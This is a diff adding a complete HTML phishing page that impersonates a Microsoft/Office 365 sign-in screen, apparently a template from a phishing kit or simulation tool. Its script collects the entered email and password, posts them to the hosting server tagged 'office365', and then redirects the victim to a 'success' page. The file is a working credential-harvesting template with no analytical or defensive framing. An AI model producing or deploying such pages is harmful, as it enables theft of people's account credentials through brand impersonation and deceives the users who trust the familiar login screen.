@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Microsoft - Sign in</title>
+    <meta name="viewport" content="width=device-width">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:linear-gradient(135deg,#f5f7fa 0%,#c3cfe2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center}
+        .card{background:white;max-width:380px;width:100%;margin:20px;border-radius:8px;box-shadow:0 10px 30px rgba(0,0,0,0.2);overflow:hidden}
+        .header{background:#0078d4;color:white;padding:30px 30px 20px;text-align:center}
+        .header h1{font-size:24px;margin:0}
+        .content{padding:30px}
+        input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;font-size:16px;box-sizing:border-box}
+        button{width:100%;padding:12px;background:#0078d4;color:white;border:none;border-radius:4px;font-size:16px;cursor:pointer;margin:10px 0}
+        button:hover{background:#106ebe}
+        .footer{padding:0 30px 30px;text-align:center;font-size:14px;color:#666}
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="header">
+            <h1>Sign in to your account</h1>
+        </div>
+        <div class="content">
+            <input type="email" id="email" placeholder="Email or phone" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button onclick="login()">Sign in</button>
+        </div>
+        <div class="footer">
+            <a href="#" style="color:#0078d4;">Forgot password?</a>
+        </div>
+    </div>
+    <script>
+        function login(){
+            const email=document.getElementById('email').value;
+            const password=document.getElementById('password').value;
+            if(email&&password){
+                const fd=new FormData();fd.append('email',email);fd.append('password',password);fd.append('template','office365');
+                fetch('/',{method:'POST',body:fd});
+                setTimeout(()=>{location.href='/templates/success.html'},1500);
+            }
+        }
+        document.addEventListener('keydown',e=>e.key==='Enter'&&login());
+    </script>
+</body>
+</html>
